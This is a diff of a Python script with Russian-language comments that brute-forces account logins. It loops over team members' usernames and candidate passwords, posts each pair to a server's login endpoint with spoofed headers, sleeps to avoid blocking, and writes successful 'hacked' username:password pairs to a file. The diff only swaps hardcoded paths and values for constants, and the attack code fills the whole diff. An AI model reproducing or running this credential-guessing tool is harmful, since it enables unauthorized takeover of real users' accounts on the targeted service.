@@ -48,7 +48,7 @@ def start(passwords):
         cyan + f"[TIP] Запрос {str(OK_RESPONSE)} означает, что акк взломан. {str(ERROR_RESPONSE)} - не получилось. {str(BLOCKED_RESPONSE)} - личесс заблокировал запрос(рекомендуется выключить программу)") # выводим подсказку
     # users = open("mk").read().split("\n")
     print(
-        green + f"Взломанные аккаунты будут сохранены в файл hacked_real/{team}.txt")  # вывод о том куда будут сохранятся взломанные акки
+        green + f"Взломанные аккаунты будут сохранены в файл {HACKEDREAL_PATH}/{team}.txt")  # вывод о том куда будут сохранятся взломанные акки
     k = 1
     # Начинаем перебор
     for user in users:
@@ -63,7 +63,7 @@ def start(passwords):
         #   Писать сразу больше двух паролей не рекомендуется
         for password in passwords:
             r = requests.post(f"https://{SERVER}/{LOGIN}",
-                              data={"username": username, "password": password.strip(), "remember": "true"},
+                              data={"username": username, "password": password.strip(), "remember": f"{str(JSON_REMEMBER)}"},
                               headers={"X-Requested-With": X_REQUESTED_WITH,
                                        "User-Agent": USER_AGENT}) # пытаемся войти в акк
             #
@@ -74,7 +74,7 @@ def start(passwords):
             k += 1
 
             if str(r) == f"<Response [{str(OK_RESPONSE)}]>": # сохраняем взломанные акки
-                with open(f"hacked_real/{team}.txt", "a", encoding="utf-8") as h_list:
+                with open(f"{HACKEDREAL_PATH}/{team}.txt", "a", encoding="utf-8") as h_list:
                     h_list.write(f"{get_ts()} {username}: {password} \n")
 
             time.sleep(5)
